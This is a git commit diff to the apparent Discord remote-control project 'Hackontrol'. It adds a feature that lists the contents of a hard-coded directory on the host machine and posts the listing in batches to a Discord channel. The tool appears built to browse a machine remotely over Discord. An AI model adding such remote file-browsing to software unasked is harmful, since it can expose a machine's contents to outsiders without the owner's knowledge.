5ea924628239414377922f31d6972d4506538688
KHOPAN <93379212+KHOPAN@users.noreply.github.com>
2024-04-24 22:10:38 +0700

    Add Limit-Proof File Scanner

--- src/com/khopan/hackontrol/channel/file/FileChannel.java
+++ src/com/khopan/hackontrol/channel/file/FileChannel.java
@@ -1,19 +1,27 @@
 package com.khopan.hackontrol.channel.file;
 
 import java.io.File;
+import java.util.ArrayList;
+import java.util.List;
 
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.manager.button.ButtonInteraction;
 import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.registry.Registry;
+import com.khopan.hackontrol.utils.ErrorUtils;
 
+import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
+import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
+import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;
 
 public class FileChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "file";
 
 	private static final String QUERY_FILE_BUTTON_IDENTIFIER = "queryFile";
+
+	private File filePointer;
 
 	@Override
 	public String getName() {
@@ -31,7 +39,63 @@ public class FileChannel extends HackontrolChannel {
 	}
 
 	private void query(ButtonInteraction interaction) {
-		File file = new File("D:\\hackontrol-logo.png");
-		FileEmbedSender.reply(file, interaction.getEvent());
+		this.filePointer = new File("D:\\GitHub Repository\\");
+		File[] fileList = this.filePointer == null ? File.listRoots() : this.filePointer.listFiles();
+		List<String> messageList = new ArrayList<>();
+		StringBuilder builder = new StringBuilder();
+		builder.append("**");
+		builder.append(this.filePointer == null ? "SYSTEMROOT" : this.filePointer.getAbsolutePath());
+		builder.append("**");
+
+		if(fileList != null && fileList.length > 0) {
+			for(int i = 0; i < fileList.length; i++) {
+				File file = fileList[i];
+				String entry = "\n" + (i + 1) + ") `" + file.getName() + '`';
+
+				if(builder.length() + entry.length() > 400) {
+					messageList.add(builder.toString());
+					builder = new StringBuilder();
+				}
+
+				builder.append(entry);
+			}
+		}
+
+		if(!builder.isEmpty()) {
+			messageList.add(builder.toString());
+		}
+
+		if(messageList.isEmpty()) {
+			ErrorUtils.sendErrorReply(interaction, new InternalError("No files available"));
+			return;
+		}
+
+		ButtonInteractionEvent Event = interaction.getEvent();
+		MessageChannelUnion channel = Event.getChannel();
+		String firstBatch = messageList.get(0);
+		messageList.remove(0);
+		ReplyCallbackAction action = Event.reply(firstBatch);
+
+		if(messageList.isEmpty()) {
+			action.addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
+			return;
+		}
+
+		action.queue(hook -> hook.retrieveOriginal().queue(message -> new Thread(() -> {
+			int size = messageList.size();
+
+			if(size == 1) {
+				channel.sendMessage(messageList.get(0)).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", message.getIdLong())).queue();
+			} else {
+				Object[] identifierList = new Object[size];
+				identifierList[0] = message.getIdLong();
+
+				for(int i = 1; i < size; i++) {
+					identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
+				}
+
+				channel.sendMessage(messageList.get(size - 1)).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", identifierList)).queue();
+			}
+		}).start()));
 	}
 }
